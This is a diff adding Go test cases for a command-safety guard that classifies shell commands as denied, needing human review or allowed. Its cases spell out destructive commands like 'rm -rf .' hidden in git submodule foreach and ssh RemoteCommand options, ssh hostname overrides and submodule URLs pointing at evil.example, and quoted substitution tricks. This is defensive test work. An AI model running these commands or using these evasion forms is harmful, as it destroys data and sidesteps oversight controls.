@@ -41,6 +41,8 @@ func TestGuardAppliesNetworkAllowlist(t *testing.T) {
 		{"ssh proxy command", "ssh -o ProxyCommand=relay api.github.com", safety.DecisionDeny, "network.destination_override"},
 		{"ssh hostname override", "ssh -o HostName=evil.example api.github.com", safety.DecisionDeny, "network.destination_override"},
 		{"ssh config file", "ssh -F ssh.conf api.github.com", safety.DecisionNeedsHumanReview, "network.config"},
+		{"Windows ssh hostname override", "ssh.exe -o HostName=evil.example api.github.com", safety.DecisionDeny, "network.destination_override"},
+		{"Windows ssh config file", "ssh.exe -F ssh.conf api.github.com", safety.DecisionNeedsHumanReview, "network.config"},
 	}
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
@@ -186,6 +188,204 @@ func TestGuardClassifiesDestructiveGitClean(t *testing.T) {
 		{
 			name:     "non clean subcommand payload",
 			command:  "git status -- clean -fdx",
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(safety.Request{Command: tc.command})
+			require.Equal(t, tc.decision, report.Decision, "%+v", report)
+			require.Equal(t, tc.rule, report.RuleID, "%+v", report)
+		})
+	}
+}
+
+func TestGuardScansGitSubmoduleForeachCommands(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.AllowedCommands = []string{
+		"git", "git.exe", "git-submodule", "git-submodule.exe", "echo",
+	}
+	guard := mustGuard(t, policy)
+	for _, tc := range []struct {
+		name     string
+		command  string
+		decision safety.Decision
+		rule     string
+	}{
+		{
+			name:     "destructive nested command",
+			command:  `git submodule foreach 'rm -rf .'`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name: "global and recursive options",
+			command: `git -C work submodule --quiet foreach --recursive ` +
+				`'rm -rf .'`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "Windows git executable",
+			command:  `git.exe submodule foreach 'rm -rf .'`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "direct git submodule helper",
+			command:  `git-submodule foreach 'rm -rf .'`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "internal git submodule helper",
+			command:  `git submodule--helper foreach 'rm -rf .'`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "unlisted nested executable",
+			command:  `git submodule foreach unlisted-helper --version`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.command",
+		},
+		{
+			name:     "allowlisted nested executable requires review",
+			command:  `git submodule foreach 'echo ready'`,
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "command.indirect_execution",
+		},
+		{
+			name:     "missing foreach command requires review",
+			command:  `git submodule foreach`,
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "command.indirect_execution",
+		},
+		{
+			name:     "other submodule operation",
+			command:  `git submodule status`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name:     "non submodule payload",
+			command:  `git status -- submodule foreach 'rm -rf .'`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(safety.Request{Command: tc.command})
+			require.Equal(t, tc.decision, report.Decision, "%+v", report)
+			require.Equal(t, tc.rule, report.RuleID, "%+v", report)
+		})
+	}
+}
+
+func TestGuardAppliesNetworkPolicyToGitSubmodules(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.AllowedCommands = []string{
+		"git", "git.exe", "git-submodule", "git-submodule.exe",
+	}
+	policy.NetworkAllowlist = []string{"github.com"}
+	policy.DeniedPaths = []string{".env", ".ssh", "credentials"}
+	guard := mustGuard(t, policy)
+	for _, tc := range []struct {
+		name     string
+		command  string
+		decision safety.Decision
+		rule     string
+	}{
+		{
+			name:     "denied add URL",
+			command:  "git submodule add https://evil.example/org/repo modules/repo",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "Windows git denied add URL",
+			command:  "git.exe submodule add https://evil.example/org/repo modules/repo",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "direct helper denied add URL",
+			command:  "git-submodule add https://evil.example/org/repo modules/repo",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "internal helper denied add URL",
+			command:  "git submodule--helper add https://evil.example/org/repo modules/repo",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name: "internal helper denied clone URL",
+			command: "git submodule--helper clone --url " +
+				"https://evil.example/org/repo --path modules/repo",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name: "internal helper allowlisted clone URL",
+			command: "git submodule--helper clone " +
+				"--url=https://api.github.com/org/repo --path modules/repo",
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name:     "internal helper clone missing URL",
+			command:  "git submodule--helper clone --path modules/repo",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "network.destination_unparsed",
+		},
+		{
+			name:     "allowlisted add URL",
+			command:  "git submodule add https://api.github.com/org/repo modules/repo",
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name: "global and add options",
+			command: "git -C work submodule add --branch main " +
+				"https://evil.example/org/repo modules/repo",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "denied SCP-style add URL",
+			command:  "git submodule add git@evil.example:org/repo modules/repo",
+			decision: safety.DecisionDeny,
+			rule:     "network.destination",
+		},
+		{
+			name:     "local add file URL",
+			command:  "git submodule add file:///workspace/repo modules/repo",
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name:     "relative repository depends on configured origin",
+			command:  "git submodule add ./repo modules/repo",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "network.destination_unparsed",
+		},
+		{
+			name:     "configured update destination",
+			command:  "git submodule update --init --recursive",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "network.destination_unparsed",
+		},
+		{
+			name:     "update can fetch missing commits",
+			command:  "git submodule update --remote",
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "network.destination_unparsed",
+		},
+		{
+			name:     "status has no network operation",
+			command:  "git submodule status",
 			decision: safety.DecisionAllow,
 			rule:     "safety.no_findings",
 		},
@@ -1340,7 +1540,7 @@ func TestGuardScansSedInlinePrograms(t *testing.T) {
 
 func TestGuardScansSSHExecutionOptions(t *testing.T) {
 	policy := safety.DefaultPolicy()
-	policy.AllowedCommands = []string{"ssh", "scp", "sftp"}
+	policy.AllowedCommands = []string{"ssh", "ssh.exe", "scp", "sftp", "echo"}
 	policy.NetworkAllowlist = []string{"github.com"}
 	guard := mustGuard(t, policy)
 	for _, tc := range []struct {
@@ -1394,6 +1594,18 @@ func TestGuardScansSSHExecutionOptions(t *testing.T) {
 			command:  `ssh -oKnownHostsCommand='rm -rf .' api.github.com`,
 			decision: safety.DecisionDeny,
 			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "remote command option",
+			command:  `ssh -oRemoteCommand='rm -rf .' api.github.com`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "disabled remote command option",
+			command:  `ssh -oRemoteCommand=none api.github.com`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
 		},
 		{
 			name:     "space separated setting",
@@ -1451,14 +1663,92 @@ func TestGuardScansSSHExecutionOptions(t *testing.T) {
 			rule:     "dangerous.rm_rf",
 		},
 		{
+			name:     "hostname override after destination",
+			command:  `ssh api.github.com -oHostname=evil.example`,
+			decision: safety.DecisionDeny,
+			rule:     "network.destination_override",
+		},
+		{
+			name:     "config file after destination",
+			command:  `ssh api.github.com -Fssh.conf`,
+			decision: safety.DecisionNeedsHumanReview,
+			rule:     "network.config",
+		},
+		{
+			name:     "remote command option after destination",
+			command:  `ssh api.github.com -oRemoteCommand='rm -rf .'`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
 			name:     "benign ssh",
 			command:  `ssh api.github.com`,
 			decision: safety.DecisionAllow,
 			rule:     "safety.no_findings",
 		},
 		{
+			name:     "remote destructive command",
+			command:  `ssh api.github.com rm -rf .`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "remote shell wrapper is blocked",
+			command:  `ssh api.github.com sh -c 'rm -rf .'`,
+			decision: safety.DecisionDeny,
+			rule:     "shell.parse_error",
+		},
+		{
+			name:     "remote quoted separator becomes shell syntax",
+			command:  `ssh api.github.com echo 'ok; rm -rf .'`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "remote quoted substitution becomes shell syntax",
+			command:  `ssh api.github.com echo '$(rm -rf .)'`,
+			decision: safety.DecisionDeny,
+			rule:     "shell.parse_error",
+		},
+		{
+			name:     "Windows remote destructive command",
+			command:  `ssh.exe api.github.com rm -rf .`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.rm_rf",
+		},
+		{
+			name:     "remote unlisted executable",
+			command:  `ssh api.github.com unlisted-helper --version`,
+			decision: safety.DecisionDeny,
+			rule:     "dangerous.command",
+		},
+		{
+			name:     "allowlisted remote executable",
+			command:  `ssh api.github.com echo ready`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
 			name:     "remote command argument resembles option",
 			command:  `ssh api.github.com echo -oLocalCommand='rm -rf .'`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name:     "remote command argument resembles hostname override",
+			command:  `ssh api.github.com echo -oHostname=evil.example`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name:     "remote command argument resembles proxy jump",
+			command:  `ssh api.github.com echo -Jevil.example`,
+			decision: safety.DecisionAllow,
+			rule:     "safety.no_findings",
+		},
+		{
+			name:     "remote command argument resembles config file",
+			command:  `ssh api.github.com echo -Fssh.conf`,
 			decision: safety.DecisionAllow,
 			rule:     "safety.no_findings",
 		},
